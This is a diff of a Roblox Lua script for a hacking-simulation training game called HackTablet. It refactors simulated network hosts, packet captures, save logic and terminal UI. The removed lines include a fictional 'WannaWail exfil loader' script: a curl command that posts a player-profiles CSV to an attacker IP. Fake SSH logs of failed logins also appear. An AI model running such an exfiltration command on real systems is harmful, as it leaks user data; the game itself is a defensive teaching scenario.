@@ -13,9 +13,16 @@ local SoundService = game:GetService("SoundService")
 local ContentProvider = game:GetService("ContentProvider")
 local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
 local Shared = ReplicatedStorage:WaitForChild("Shared")
 local ObjectiveManager = require(Shared:WaitForChild("ObjectiveManager"))
 local ScenarioData = require(Shared:WaitForChild("ScenarioData"))
+local CameraMetadata = require(Shared:WaitForChild("CameraMetadata"))
+local TabletData = require(script.Parent:WaitForChild("TabletData"))
+local TabletIncidentLogs = require(script.Parent:WaitForChild("TabletIncidentLogs"))
+local TabletSimOps = require(script.Parent:WaitForChild("TabletSimOps"))
+local TabletMainUI = require(script.Parent:WaitForChild("TabletMainUI"))
+local TabletMissionUI = require(script.Parent:WaitForChild("TabletMissionUI"))
 local Player = Players.LocalPlayer
 local PlayerGui = Player:WaitForChild("PlayerGui")
 local TOOL_NAME = "HackTablet"
@@ -24,235 +31,111 @@ local PROMPT = "rbxplayer@hackos:~$ "
 local AUDIO_TAG = "HackTablet_Audio"
 local E_BIND = "HackTablet_E_Block"
 local BLUR_NAME = "HackStartBlur"
-local SAVE_KEYS = { "Obj_Admin", "TimesLeaked" }
+local RESTORE_STATE_ATTRIBUTE = "HackTabletRestoreBlob"
+local SAVE_REMOTE_NAME = "SaveProgress"
+local START_OVER_REMOTE_NAME = "StartOverProgress"
+local CAMERA_JAM_REMOTE_NAME = "JamCamera"
+local DISTRACT_GUARD_REMOTE_NAME = "DistractOutGuard"
+local WANNAWAIL_ATTR_ACTIVE = "WannaWailActive"
+local WANNAWAIL_ATTR_COUNT = "WannaWailInfectedCount"
+local WANNAWAIL_ATTR_LAST_MACHINE = "WannaWailLastMachine"
+local WANNAWAIL_ATTR_SOURCE_BLOCKED = "WannaWailSourceBlocked"
+local WANNAWAIL_ATTR_FIREWALL_BLOCKED = "WannaWailFirewallRuleAdded"
+local WANNAWAIL_ATTR_PROCESS_KILLED = "WannaWailProcessKilled"
+local WANNAWAIL_ATTR_LOADER_REMOVED = "WannaWailLoaderRemoved"
+local WANNAWAIL_ATTR_CONTAINED = "WannaWailContained"
+local WANNAWAIL_ATTACKER_IP = "203.44.18.77"
+local AUTO_SAVE_DELAY = 1.5
+local DEFAULT_CHAPTER3_MAILBOX = TabletData.DEFAULT_CHAPTER3_MAILBOX
+local CHAPTER3_MAILBOX = TabletData.resolveChapter3Mailbox(ScenarioData)
+local FakePlayerRows = TabletData.FakePlayerRows
+local SimHosts = TabletData.SimHosts
+local SimFSByHost = TabletData.SimFSByHost
+local SimFileContentsByHost = TabletData.SimFileContentsByHost
+local SimMetadataByHost = TabletData.SimMetadataByHost
+local OpenFiles = {}
+local SimProcessesByHost = TabletData.SimProcessesByHost
+local FakeAdminRecords = TabletData.FakeAdminRecords
+local AdminLogFeed = TabletData.AdminLogFeed
+local PAGES = TabletData.PAGES
+
 local isEquipped = false
 local started = false
 local lastEquipped = false
-local MainGUI, HintGUI
+
+local MainGUI, HintGUI, ReplayPromptGUI
 local TermFrame, BrowserFrame, TermOut, TermInput, UrlBox, PageLabel, ClockLabel, MissionsFrame, MissionsList, ObjectivesList
-local chapterExpanded = {}
 local BrowserStatusLabel, BrowserContent, LinkBar
 local AdminLoginPage, AdminDashboardPage, AdminUserBox, AdminPassBox, AdminLoginStatus, AdminSearchBox, AdminResultsFrame
 local PacketPage, PacketToolbar, PacketListFrame, PacketIPBox, PacketDNSBox, PacketApplyBtn, PacketClearBtn, PacketFollowBtn
+
+
 local browserState = {
-adminLoggedIn = false,
-currentUrl = "about:blank",
+    adminLoggedIn = false,
+    currentUrl = "about:blank",
+    stickyNoteInspected = false,
+    adminTab = "database",
+    blockedIPs = {},
+    selectedMailId = type(CHAPTER3_MAILBOX[1]) == "table" and tostring(CHAPTER3_MAILBOX[1].id or "") or "",
+    logStreamStartedAt = 0,
+    logsLastRender = 0,
+    lastInteractionAt = os.clock(),
+    idleAutoSaveNotified = false,
+    visiblePanel = "terminal",
+}
+local terminalState = {
+    currentHost = "local",
+    currentDir = "/",
+    connectedHost = nil,
+    sshSession = false,
+    scanCache = nil,
+    sniffCache = nil,
+    lastAttackerIP = WANNAWAIL_ATTACKER_IP,
 }
 local commandHistory = {}
 local historyIndex = nil
 local currentDraft = ""
-local terminalState = {
-currentHost = "local",
-currentDir = "/",
-connectedHost = nil,
-sshSession = false,
-scanCache = nil,
-sniffCache = nil,
-lastAttackerIP = "203.44.18.77",
-}
+local autoSaveQueuedAt = 0
+local autoSaveLastRunAt = 0
+local autoSaveInFlight = false
+local autoSaveSuppressed = false
+local replayPromptShown = false
+local replayPromptClearDone = false
+local chapterExpanded = {}
+
 local ActivePacketCapture = {
-targetIP = "",
-targetLabel = "",
-rows = {},
+    targetIP = "",
+    targetLabel = "",
+    rows = {},
 }
-local function makePlayerRecord(i)
-local first = { "Aiden", "Nova", "Jules", "Mika", "Riley", "Zane", "Lena", "Kai", "Iris", "Noah", "Milo", "Ava" }
-local last = { "Stone", "Mercer", "Blaze", "Skylark", "Rift", "Vale", "Keen", "Pixel", "Byte", "Crest", "Ash", "Orbit" }
-local region = { "US-West", "US-East", "EU-Central", "Asia-South", "SA-East" }
-local plans = { "Basic", "Plus", "Ultra", "Creator" }
-local status = { "Active", "Idle", "Streaming", "Recently Logged In" }
-local uname = (first[(i % #first) + 1] .. last[((i * 2) % #last) + 1] .. tostring(100 + i))
-return {
-username = uname,
-display = first[((i + 3) % #first) + 1] .. " " .. last[((i + 5) % #last) + 1],
-region = region[((i + 1) % #region) + 1],
-plan = plans[((i + 2) % #plans) + 1],
-status = status[((i + 3) % #status) + 1],
-}
+
+local addLine, historyUp, historyDown
+local captureProgressState, applyProgressState, applyPendingRestoreState, submitScenarioAction
+local installSimOps
+
+local function getWannaWailIncidentLogs()
+return TabletIncidentLogs.getWannaWailIncidentLogs(Player, {
+WANNAWAIL_ATTR_COUNT = WANNAWAIL_ATTR_COUNT,
+WANNAWAIL_ATTR_ACTIVE = WANNAWAIL_ATTR_ACTIVE,
+WANNAWAIL_ATTR_LAST_MACHINE = WANNAWAIL_ATTR_LAST_MACHINE,
+WANNAWAIL_ATTR_SOURCE_BLOCKED = WANNAWAIL_ATTR_SOURCE_BLOCKED,
+WANNAWAIL_ATTR_FIREWALL_BLOCKED = WANNAWAIL_ATTR_FIREWALL_BLOCKED,
+WANNAWAIL_ATTR_PROCESS_KILLED = WANNAWAIL_ATTR_PROCESS_KILLED,
+WANNAWAIL_ATTR_LOADER_REMOVED = WANNAWAIL_ATTR_LOADER_REMOVED,
+WANNAWAIL_ATTR_CONTAINED = WANNAWAIL_ATTR_CONTAINED,
+WANNAWAIL_ATTACKER_IP = WANNAWAIL_ATTACKER_IP,
+}, AdminLogFeed)
 end
-local FakePlayerRows = {}
-for i = 1, 20 do
-table.insert(FakePlayerRows, makePlayerRecord(i))
-end
-local SimHosts = {
-["bloxplay_itwifi"] = {
-label = "Bloxplay_ITWifi",
-ip = "192.168.32.10",
-mac = "A4:2B:11:9C:7D:10",
-server = "PulseServe",
-ports = { 53, 67, 68, 80, 443 },
-role = "Wireless gateway",
-},
-["bloxplay_adminwifi"] = {
-label = "Bloxplay_AdminWifi",
-ip = "192.168.43.2",
-mac = "B8:77:21:4E:91:02",
-server = "CorePanel",
-ports = { 22, 80, 443, 8080 },
-role = "Admin wireless gateway",
-},
-["laptop"] = {
-label = "Laptop",
-ip = "192.168.32.12",
-mac = "5C:90:23:AA:10:12",
-server = "CloudFrame",
-ports = { 53, 80, 443, 5151 },
-role = "Employee workstation",
-},
-["stream_dispatch"] = {
-label = "StreamDispatch_01",
-ip = "192.168.32.60",
-mac = "54:71:3A:CD:60:01",
-server = "StreamForge",
-ports = { 80, 443, 554, 9000 },
-role = "Session relay node",
-},
-["player_data"] = {
-label = "PlayerData_Vault",
-ip = "192.168.43.20",
-mac = "18:C0:4D:88:2A:20",
-server = "VaultLeaf",
-ports = { 22, 80, 443, 445, 3306 },
-role = "Player profile storage",
-},
-["creator_stats"] = {
-label = "CreatorStats_Node",
-ip = "192.168.43.25",
-mac = "1C:B2:6F:72:25:01",
-server = "MetricBloom",
-ports = { 80, 443, 9200 },
-role = "Creator analytics server",
-},
-["frontdesk_pc"] = {
-label = "FrontDesk_PC",
-ip = "192.168.32.22",
-mac = "2C:6D:C1:77:44:22",
-server = "DeskWave",
-ports = { 53, 80, 443 },
-role = "Reception workstation",
-},
-["security_cam_hall"] = {
-label = "SecurityCam_Hall",
-ip = "192.168.32.31",
-mac = "90:4F:DA:3B:20:31",
-server = "LensTrack",
-ports = { 80, 443, 554 },
-role = "Hallway camera",
-},
-["printer_ops"] = {
-label = "Printer_Ops",
-ip = "192.168.32.44",
-mac = "44:B1:FA:21:66:44",
-server = "InkPort",
-ports = { 80, 443, 9100 },
-role = "Office printer",
-},
-["backup_node"] = {
-label = "Backup_Node",
-ip = "192.168.43.55",
-mac = "70:AF:24:91:55:55",
-server = "EchoKeep",
-ports = { 22, 80, 443, 873 },
-role = "Backup system",
-},
-}
-local SimFSByHost = {
-localhost = {
-["/"] = { "home", "logs", "tmp", "notes.txt", "readme.txt", "capture.pcap" },
-["/home"] = { "player.txt", "chapter1.txt", "mail.txt" },
-["/logs"] = { "system.log", "network.log" },
-["/tmp"] = { "cache.dat" },
-},
-["playerdata_vault"] = {
-["/"] = { "home", "var", "etc", "srv", "auth.log", "report.txt", "sync_jobs.sh", "player_profiles.db" },
-["/home"] = { "admin.txt", "ops.txt" },
-["/var"] = { "www", "backups", "tmp" },
-["/etc"] = { "passwd", "sshd_config", "firewall.rules" },
-["/srv"] = { "profiles.csv", "sessions.csv", "payouts.csv" },
-},
-}
-local function buildPlayerProfilesCSV()
-local lines = { "username,display_name,region,plan,status" }
-for _, row in ipairs(FakePlayerRows) do
-table.insert(lines, table.concat({ row.username, row.display, row.region, row.plan, row.status }, ","))
-end
-return table.concat(lines, "\n")
-end
-local SimFileContentsByHost = {
-localhost = {
-["readme.txt"] = "HackOS SIM filesystem.\nEverything here is fictional.",
-["notes.txt"] = "Training flow:\n1) scan nearby networks\n2) inspect packets\n3) connect safely\n4) investigate logs",
-["capture.pcap"] = "PCAP SUMMARY (SIM)\n- weak WiFi observed\n- admin credential-like packet seen\n- outbound beacon flagged",
-["player.txt"] = "Local profile (SIM)\nuser=rbxplayer\nrole=junior analyst",
-["chapter1.txt"] = "Hint:\nStart with nearby recon\nFollow workstation traffic\nThen inspect packets",
-["mail.txt"] = "Inbox preview (SIM)\nOne suspicious message references 'urgent account verification'",
-["system.log"] = "[00:10] boot ok\n[00:11] terminal ready\n[00:12] browser renderer online",
-["network.log"] = "[net] Bloxplay_ITWifi seen\n[net] Bloxplay_AdminWifi seen\n[net] PlayerData_Vault referenced in captured traffic",
-["cache.dat"] = "temporary cache blob (sim)",
-},
-["playerdata_vault"] = {
-["auth.log"] = table.concat({
-"2026-03-24 08:02:14 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
-"2026-03-24 08:02:27 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77",
-"2026-03-24 08:04:08 sshd[1322]: Accepted password for bloxplay-admin from 192.168.32.12",
-"2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77",
-}, "\n"),
-["report.txt"] = "Server report (SIM)\n- outbound traffic spike detected\n- investigate running processes\n- review netstat output",
-["sync_jobs.sh"] = "#!/bin/sh\n# WannaWail (fictional) exfil loader\ncurl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv",
-["admin.txt"] = "admin home note (SIM)\nPassword changed recently after incident drills.",
-["ops.txt"] = "ops note (SIM)\nIf traffic spikes, inspect psrep and netstat first.",
-["passwd"] = "root:x:0:0\nbloxplay-admin:x:1001:1001\nbackup:x:1002:1002",
-["sshd_config"] = "PermitRootLogin no\nPasswordAuthentication yes\nAllowUsers bloxplay-admin backup",
-["firewall.rules"] = "ALLOW 192.168.0.0/16\nDENY 0.0.0.0/0 -> 23/tcp",
-["player_profiles.db"] = "profile store (sim)",
-["profiles.csv"] = buildPlayerProfilesCSV(),
-["sessions.csv"] = "session_id,username,node,status\nS1,ByteCrest109,StreamDispatch_01,active\nS2,NoahStone103,StreamDispatch_01,active",
-["payouts.csv"] = "creator_id,month,credits\nC-100,Mar,1200\nC-101,Mar,980",
-},
-}
-local OpenFiles = {}
-local SimProcessesByHost = {
-localhost = {
-{ pid = 101, name = "hackos-shell", status = "Running" },
-{ pid = 214, name = "browser-render", status = "Sleeping" },
-{ pid = 337, name = "packet-analyzer", status = "Running" },
-{ pid = 404, name = "mail-decoy-check", status = "Idle" },
-},
-["playerdata_vault"] = {
-{ pid = 602, name = "sshd", status = "Running" },
-{ pid = 774, name = "vaultleafd", status = "Running" },
-{ pid = 911, name = "profile-sync", status = "Sleeping" },
-{ pid = 1337, name = "sync_jobs.sh", status = "Running" },
-},
-}
-local FakeAdminRecords = {
-{ username = "rick_dev", role = "Developer", dept = "Systems", note = "Reset password requested last week." },
-{ username = "novaplayz", role = "Moderator", dept = "Community", note = "Remote login from 192.168.32.12 flagged." },
-{ username = "marcus_lee", role = "IT Support", dept = "Infrastructure", note = "Accessed PlayerData_Vault successfully." },
-{ username = "junpark", role = "Security Analyst", dept = "Security", note = "Left note about weak WiFi segmentation." },
-{ username = "bloxplay-admin", role = "Administrator", dept = "Core Ops", note = "Credentials spotted in simulated HTTP traffic." },
-{ username = "vault_ops", role = "Data Steward", dept = "Trust & Safety", note = "PlayerData_Vault exposes user profile sync logs." },
-}
-local PAGES = {
-["hackos://home"] =
-"Welcome to HackOS (SIM)\n\nQuick Links:\n- hackos://tips\n- hackos://apps\n- RBXPacketNet.com\n- bloxplay.com/admin\n\nTraining Path:\n1) Scan nearby devices\n2) Inspect targeted packet traffic\n3) Pivot to PlayerData_Vault\n4) Review logs and processes\n5) Stop the attacker",
-["hackos://tips"] =
-"Safety Tips (SIM)\n\n- Use strong passwords\n- Turn on 2FA\n- Verify suspicious login pages\n- Review logs after incidents",
-["hackos://apps"] =
-"Apps (SIM)\n- Terminal\n- Browser\n- Packet Analyzer (RBXPacketNet.com)\n- Admin Portal (bloxplay.com/admin)",
-["bloxplay.com/admin"] =
-"BLOXPLAY ADMIN LOGIN (SIM)\nUse the browser login form.",
-["www.bloxplay.com/admin"] =
-"BLOXPLAY ADMIN LOGIN (SIM)\nUse the browser login form.",
-["rbxpacketnet.com"] =
-"RBXPacketNet (SIM)\nBrowser packet analyzer ready.",
-["www.rbxpacketnet.com"] =
-"RBXPacketNet (SIM)\nBrowser packet analyzer ready.",
-}
+
 local function notify(t)
 pcall(function()
 StarterGui:SetCore("SendNotification", t)
 end)
+end
+
+browserState._markInteraction = function()
+	browserState.lastInteractionAt = os.clock()
+	browserState.idleAutoSaveNotified = false
 end
 local function mk(t, p)
 local i = Instance.new(t)
@@ -273,11 +156,6 @@ Volume = math.clamp(v, 0, 10),
 end)
 end
 notify({ Title = "SIMULATION WARNING", Text = "Simulated interface. Do not replicate in real life.", Duration = 5 })
-pcall(function()
-if Player:GetAttribute("HasKeycardData") ~= nil then
-Player:SetAttribute("HasKeycardData", nil)
-end
-end)
 local function getSound()
 local s = SoundService:FindFirstChild(AUDIO_TAG)
 if s and s:IsA("Sound") then
@@ -323,40 +201,243 @@ local function setEquipped(on)
 isEquipped = on
 Player:SetAttribute("HackTabletEquipped", on)
 end
-local function saveNow()
-local out = {}
-for _, k in ipairs(SAVE_KEYS) do
-local v = Player:GetAttribute(k)
-if v ~= nil then
-out[k] = v
+local function getRemote(name)
+local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+if not remotes then
+return nil
+end
+return remotes:FindFirstChild(name)
+end
+local function getVisibleCameraLabels()
+local labels = {}
+local seen = {}
+for _, obj in ipairs(Workspace:GetDescendants()) do
+if obj:IsA("Model") and obj.Name == "Camera" then
+local label = tostring(CameraMetadata.GetLocationLabel(obj) or "Unknown Location")
+if label ~= "" and not seen[label] then
+seen[label] = true
+labels[#labels + 1] = label
 end
 end
-Player:SetAttribute("SaveBlob", Http:JSONEncode(out))
-notify({ Title = "HackTablet", Text = "Progress saved.", Duration = 2 })
 end
-local function loadNow()
-local raw = Player:GetAttribute("SaveBlob")
-if type(raw) ~= "string" or #raw == 0 then
-return
+table.sort(labels)
+return labels
 end
-local ok, data = pcall(function()
-return Http:JSONDecode(raw)
+local function requestCameraJamFromTablet(options)
+options = options or {}
+browserState._markInteraction()
+local labels = getVisibleCameraLabels()
+if #labels == 0 then
+local message = "No camera models detected by the tablet jammer."
+if BrowserStatusLabel then
+BrowserStatusLabel.Text = message
+end
+notify({ Title = "HackTablet", Text = message, Duration = 3 })
+if options.echoTerminal and TermOut and TermOut.Parent then
+addLine(message)
+end
+return false
+end
+local jamRemote = getRemote(CAMERA_JAM_REMOTE_NAME)
+if not jamRemote or not jamRemote:IsA("RemoteFunction") then
+local message = "Camera jammer service unavailable."
+if BrowserStatusLabel then
+BrowserStatusLabel.Text = message
+end
+notify({ Title = "HackTablet", Text = message, Duration = 3 })
+if options.echoTerminal and TermOut and TermOut.Parent then
+addLine(message)
+end
+return false
+end
+local ok, result = pcall(function()
+return jamRemote:InvokeServer("camera_network")
 end)
-if not ok or type(data) ~= "table" then
-return
+local message = nil
+if ok and type(result) == "table" then
+message = tostring(result.message or "Camera jam request sent.")
+else
+message = "Camera jammer request failed."
 end
-for k, v in pairs(data) do
-Player:SetAttribute(k, v)
+if BrowserStatusLabel then
+BrowserStatusLabel.Text = message
 end
-notify({ Title = "HackTablet", Text = "Progress loaded.", Duration = 2 })
+notify({ Title = "HackTablet", Text = message, Duration = 4 })
+if options.echoTerminal and TermOut and TermOut.Parent then
+addLine(message)
 end
+return ok and type(result) == "table" and result.success == true
+end
+
+local function requestGuardDistractFromTablet(options)
+	options = options or {}
+	browserState._markInteraction()
+
+	local distractRemote = getRemote(DISTRACT_GUARD_REMOTE_NAME)
+	if not distractRemote or not distractRemote:IsA("RemoteEvent") then
+		local message = "Guard distraction service unavailable."
+		if BrowserStatusLabel then
+			BrowserStatusLabel.Text = message
+		end
+		notify({ Title = "HackTablet", Text = message, Duration = 3 })
+		if options.echoTerminal and TermOut and TermOut.Parent then
+			addLine(message)
+		end
+		return false
+	end
+
+	local ok = pcall(function()
+		distractRemote:FireServer()
+	end)
+
+	local message
+	if ok then
+		message = "Outside guard distracted for 15 seconds."
+	else
+		message = "Guard distraction request failed."
+	end
+
+	if BrowserStatusLabel then
+		BrowserStatusLabel.Text = message
+	end
+
+	notify({ Title = "HackTablet", Text = message, Duration = 4 })
+
+	if options.echoTerminal and TermOut and TermOut.Parent then
+		addLine(message)
+	end
+
+	return ok
+end
+local function saveNow(options)
+options = options or {}
+if autoSaveSuppressed then
+if not options.silent then
+notify({ Title = "HackTablet", Text = "Saving is disabled after mission completion.", Duration = 3 })
+end
+autoSaveQueuedAt = 0
+return false
+end
+if autoSaveInFlight then
+if options.force then
+autoSaveQueuedAt = os.clock()
+end
+return false
+end
+local saveRemote = getRemote(SAVE_REMOTE_NAME)
+if not saveRemote then
+if not options.silent then
+notify({ Title = "HackTablet", Text = "Save service unavailable.", Duration = 3 })
+end
+return false
+end
+autoSaveInFlight = true
+local ok, result = pcall(function()
+return saveRemote:InvokeServer(captureProgressState and captureProgressState() or nil)
+end)
+autoSaveInFlight = false
+if not ok or type(result) ~= "table" or not result.success then
+if not options.silent then
+notify({ Title = "HackTablet", Text = "Could not save progress.", Duration = 3 })
+end
+return false
+end
+autoSaveQueuedAt = 0
+autoSaveLastRunAt = os.clock()
+if not options.silent then
+notify({ Title = "HackTablet", Text = tostring(result.message or "Progress saved."), Duration = 2 })
+end
+return true
+end
+
+local function queueAutoSave(_force)
+if autoSaveSuppressed then
+autoSaveQueuedAt = 0
+return false
+end
+autoSaveQueuedAt = os.clock()
+return true
+end
+
 local function teardownStart()
 local blur = Lighting:FindFirstChild(BLUR_NAME)
 if blur then blur:Destroy() end
 local boot = PlayerGui:FindFirstChild("HackStart")
 if boot then boot:Destroy() end
 end
-local function addLine(txt, color)
+local function sanitizeTerminalText(txt)
+local value = tostring(txt or "")
+local maxRun = 28
+value = value:gsub("([^%s%-_/%.,:;%(%)%[%]%{%}%+=]+)", function(token)
+if #token <= maxRun then
+return token
+end
+local chunks = {}
+for i = 1, #token, maxRun do
+chunks[#chunks + 1] = token:sub(i, i + maxRun - 1)
+end
+return table.concat(chunks, "\n")
+end)
+return value
+end
+
+local function ensureTerminalList()
+if not TermOut then
+return nil
+end
+local layout = TermOut:FindFirstChild("UIListLayout")
+if layout and layout:IsA("UIListLayout") then
+return layout
+end
+TermOut:ClearAllChildren()
+layout = mk("UIListLayout", {
+Parent = TermOut,
+Name = "UIListLayout",
+Padding = UDim.new(0, 4),
+SortOrder = Enum.SortOrder.LayoutOrder,
+HorizontalAlignment = Enum.HorizontalAlignment.Left,
+})
+return layout
+end
+
+local function refreshTerminalCanvas()
+local layout = ensureTerminalList()
+if not (TermOut and layout) then
+return
+end
+local function update()
+if not (TermOut and layout and layout.Parent == TermOut) then
+return
+end
+local contentHeight = layout.AbsoluteContentSize.Y
+local viewportHeight = TermOut.AbsoluteWindowSize.Y > 0 and TermOut.AbsoluteWindowSize.Y or TermOut.AbsoluteSize.Y
+TermOut.CanvasSize = UDim2.new(0, 0, 0, contentHeight + 12)
+TermOut.CanvasPosition = Vector2.new(0, math.max(0, (contentHeight + 12) - viewportHeight))
+end
+task.defer(update)
+task.delay(0.03, update)
+end
+
+local function resetTerminalOutput(initialText)
+if not TermOut then
+return
+end
+TermOut:ClearAllChildren()
+ensureTerminalList()
+TermOut.CanvasSize = UDim2.new(0, 0, 0, 0)
+TermOut.CanvasPosition = Vector2.new(0, 0)
+if type(initialText) == "string" and initialText ~= "" then
+addLine(initialText)
+else
+refreshTerminalCanvas()
+end
+end
+
+addLine = function(txt, color)
+if not TermOut then
+return
+end
+ensureTerminalList()
 mk("TextLabel", {
 Parent = TermOut,
 BackgroundTransparency = 1,
@@ -364,19 +445,18 @@ Font = Enum.Font.Code,
 TextSize = 15,
 TextColor3 = color or Color3.fromRGB(172, 255, 198),
 TextXAlignment = Enum.TextXAlignment.Left,
+TextYAlignment = Enum.TextYAlignment.Top,
 TextWrapped = true,
+TextTruncate = Enum.TextTruncate.None,
 AutomaticSize = Enum.AutomaticSize.Y,
-Size = UDim2.new(1, -10, 0, 0),
-Text = txt,
+Size = UDim2.new(1, -12, 0, 0),
+ClipsDescendants = true,
+RichText = false,
+Text = sanitizeTerminalText(txt),
 })
-task.defer(function()
-local layout = TermOut:FindFirstChild("UIListLayout")
-if layout then
-TermOut.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
-TermOut.CanvasPosition = Vector2.new(0, math.huge)
+refreshTerminalCanvas()
 end
-end)
-end
+
 local function normalizeUrl(url)
 local u = tostring(url or ""):gsub("^%s+", ""):gsub("%s+$", "")
 if u == "" then return "about:blank" end
@@ -384,7 +464,9 @@ local low = u:lower()
 if low == "home" then return "hackos://home" end
 if low == "tips" then return "hackos://tips" end
 if low == "apps" then return "hackos://apps" end
+if low == "mail" or low == "bloxmail" then return "mail.bloxplay.com" end
 if low == "packetanalyzer" or low == "rbxpacketnet" then return "rbxpacketnet.com" end
+if low == "ipblocker" or low == "rbxipblocker" then return "rbxipblocker.com" end
 if low:sub(1, 8) == "hackos://" then
 return low
 end
@@ -400,6 +482,10 @@ local function hideAllBrowserPages()
 if AdminLoginPage then AdminLoginPage.Visible = false end
 if AdminDashboardPage then AdminDashboardPage.Visible = false end
 if PacketPage then PacketPage.Visible = false end
+local mailPage = BrowserContent and BrowserContent:FindFirstChild("MailPage")
+if mailPage then mailPage.Visible = false end
+local ipBlockerPage = BrowserContent and BrowserContent:FindFirstChild("IPBlockerPage")
+if ipBlockerPage then ipBlockerPage.Visible = false end
 if PageLabel then PageLabel.Visible = false end
 end
 local function randomChoice(t)
@@ -432,54 +518,148 @@ ActivePacketCapture.targetLabel = ""
 ActivePacketCapture.rows = {}
 return false
 end
-local protocols = { "TCP", "UDP", "DNS", "HTTP", "HTTPS" }
-local dnsNames = {
-"bloxplay.com",
-"admin.bloxplay.local",
-"playerdata.bloxplay.local",
-"streamrelay.bloxplay.net",
-"cdn.bloxplay.net",
-"auth.bloxplay.local",
-"creatorhub.bloxplay.local",
-}
-local peerHosts = getAllHostsList()
 local rows = {}
-local count = math.random(10, 16)
-for _ = 1, count do
-local proto = randomChoice(protocols)
-local peer = randomChoice(peerHosts)
-local srcIP, dstIP
-local dnsText = randomChoice(dnsNames)
-local port = tostring(randomChoice(host.ports))
-local serverName = host.server
-if math.random() < 0.5 then
-srcIP = host.ip
-dstIP = peer.ip
-else
-srcIP = peer.ip
-dstIP = host.ip
-end
-if proto == "DNS" then
-port = tostring(randomChoice({ 53, 5353 }))
-serverName = "NameMesh"
-elseif proto == "HTTP" then
-port = "80"
-elseif proto == "HTTPS" then
-port = "443"
-elseif proto == "TCP" then
-port = tostring(randomChoice(host.ports))
-elseif proto == "UDP" then
-port = tostring(randomChoice(host.ports))
-end
-table.insert(rows, {
+if host.label == "Laptop" then
+rows = {
+{
 ip = host.ip,
-protocol = proto,
-dns = dnsText,
-port = port,
-server = serverName,
-src = srcIP,
-dst = dstIP,
-})
+protocol = "DNS",
+dns = "admin.bloxplay.local",
+port = "53",
+server = "NameMesh",
+src = "192.168.32.12",
+dst = "192.168.32.10",
+tag = "Exposure",
+tone = "warning",
+summary = "Workstation resolves an internal admin zone from the same user-facing network path.",
+},
+{
+ip = host.ip,
+protocol = "HTTPS",
+dns = "bloxplay.com/admin",
+port = "443",
+server = "CorePanel",
+src = "192.168.32.12",
+dst = "192.168.43.2",
+tag = "Vulnerability",
+tone = "danger",
+summary = "Admin portal is reachable from a mixed-trust workstation segment.",
+},
+{
+ip = host.ip,
+protocol = "HTTPS",
+dns = "auth.bloxplay.local",
+port = "443",
+server = "CorePanel",
+src = "192.168.32.12",
+dst = "192.168.43.2",
+tag = "Credential Path",
+tone = "danger",
+summary = "Authentication traffic shares the same route as user workstation activity.",
+},
+{
+ip = host.ip,
+protocol = "HTTPS",
+dns = "playerdata.bloxplay.local",
+port = "443",
+server = "VaultLeaf",
+src = "192.168.32.12",
+dst = "192.168.43.20",
+tag = "Sensitive",
+tone = "warning",
+summary = "The workstation can talk directly to player-data services across the exposed path.",
+},
+{
+ip = host.ip,
+protocol = "HTTP",
+dns = "sync-edge.bloxcdn.net",
+port = "80",
+server = "VaultLeaf",
+src = "192.168.43.20",
+dst = "203.44.18.77",
+tag = "Suspicious",
+tone = "danger",
+summary = "Unexpected cleartext callback leaves the protected zone during the capture window.",
+},
+{
+ip = host.ip,
+protocol = "DNS",
+dns = "cdn.bloxplay.net",
+port = "53",
+server = "NameMesh",
+src = "192.168.32.12",
+dst = "192.168.32.10",
+tag = "Normal",
+tone = "normal",
+summary = "Routine content delivery lookup from the workstation.",
+},
+}
+elseif host.label == "PlayerData_Vault" then
+rows = {
+{
+ip = host.ip,
+protocol = "HTTPS",
+dns = "playerdata.bloxplay.local",
+port = "443",
+server = "VaultLeaf",
+src = "192.168.43.20",
+dst = "192.168.43.2",
+tag = "Internal",
+tone = "normal",
+summary = "Expected vault-to-gateway management traffic.",
+},
+{
+ip = host.ip,
+protocol = "HTTP",
+dns = "sync-edge.bloxcdn.net",
+port = "80",
+server = "VaultLeaf",
+src = "192.168.43.20",
+dst = "203.44.18.77",
+tag = "Suspicious",
+tone = "danger",
+summary = "External callback from the vault appears outside approved maintenance flow.",
+},
+{
+ip = host.ip,
+protocol = "HTTPS",
+dns = "bloxplay.com/admin",
+port = "443",
+server = "CorePanel",
+src = "192.168.43.2",
+dst = "192.168.43.20",
+tag = "Control",
+tone = "warning",
+summary = "Management traffic is transiting the same trust path as the incident activity.",
+},
+}
+else
+rows = {
+{
+ip = host.ip,
+protocol = "DNS",
+dns = "cdn.bloxplay.net",
+port = "53",
+server = "NameMesh",
+src = host.ip,
+dst = "192.168.32.10",
+tag = "Normal",
+tone = "normal",
+summary = "Routine service discovery from the selected host.",
+},
+{
+ip = host.ip,
+protocol = "HTTPS",
+dns = "bloxplay.com",
+port = "443",
+server = host.server,
+src = host.ip,
+dst = "192.168.32.10",
+tag = "Observed",
+tone = "warning",
+summary = "General application traffic from the selected system.",
+},
+}
 end
 ActivePacketCapture.targetIP = host.ip
 ActivePacketCapture.targetLabel = host.label
@@ -635,16 +815,247 @@ hideAllBrowserPages()
 if AdminLoginPage then
 AdminLoginPage.Visible = true
 end
-setBrowserStatus(("Loaded %s (sim auth required)"):format(url))
+if AdminLoginStatus then
+AdminLoginStatus.Text = "Administrator credentials required."
+end
+setBrowserStatus(("Loaded %s (credentials required)"):format(url))
+end
+local function renderAdminLogs()
+if not AdminDashboardPage then return end
+local logsFrame = AdminDashboardPage:FindFirstChild("AdminLogsFrame")
+if not logsFrame or not logsFrame:IsA("ScrollingFrame") then return end
+for _, child in ipairs(logsFrame:GetChildren()) do
+if child:IsA("Frame") then
+child:Destroy()
+end
+end
+local layout = logsFrame:FindFirstChild("UIListLayout")
+if not layout then
+layout = mk("UIListLayout", {
+Parent = logsFrame,
+Name = "UIListLayout",
+Padding = UDim.new(0, 6),
+SortOrder = Enum.SortOrder.LayoutOrder,
+})
+end
+local logs = {}
+for _, entry in ipairs(AdminLogFeed.base) do
+logs[#logs + 1] = entry
+end
+for _, entry in ipairs(getWannaWailIncidentLogs()) do
+logs[#logs + 1] = entry
+end
+for _, entry in ipairs(logs) do
+local chipColor = Color3.fromRGB(78, 125, 255)
+local cardColor = Color3.fromRGB(243, 247, 255)
